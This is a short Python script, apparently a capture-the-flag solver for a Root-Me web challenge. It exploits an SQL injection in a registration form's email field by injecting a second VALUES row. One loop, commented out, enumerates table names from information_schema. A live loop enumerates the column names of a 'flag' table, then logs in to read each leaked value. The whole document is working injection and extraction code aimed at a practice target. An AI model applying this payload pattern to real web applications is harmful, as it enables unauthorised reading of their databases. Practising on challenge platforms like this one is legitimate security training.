import requests

#find table_name
# for i in range(0,100):
	# payload = {"username":i+211111,"password":"2","email":"23'),('"+ str(i+2111110) +"','1',(select table_name from information_schema.tables limit "+str(i)+",1))-- -"}
	# r = requests.post("http://challenge01.root-me.org/web-serveur/ch33/?action=register", data = payload)
	# if "logged" in r.text:
		# Data = {"username":i+2111110,"password":"1"}
		# r = requests.post("http://challenge01.root-me.org/web-serveur/ch33/?action=login", data = Data)
		# a = r.text.split("Email : ")
		# b = a[1].split("<br />")
		# if b[0]!='':
			# print b[0]
		# else:
			# break
			
#find column
for i in range(0,100):
	payload = {"username":i+221111,"password":"2","email":"23'),('"+ str(i+2211110) +"','1',(select column_name from information_schema.columns where table_name=0x666c6167 limit "+str(i)+",1))-- -"}
	r = requests.post("http://challenge01.root-me.org/web-serveur/ch33/?action=register", data = payload)
	if "logged" in r.text:
		Data = {"username":i+2211110,"password":"1"}
		r = requests.post("http://challenge01.root-me.org/web-serveur/ch33/?action=login", data = Data)
		a = r.text.split("Email : ")
		b = a[1].split("<br />")
		if b[0]!='':
			print b[0]
		else:
			break
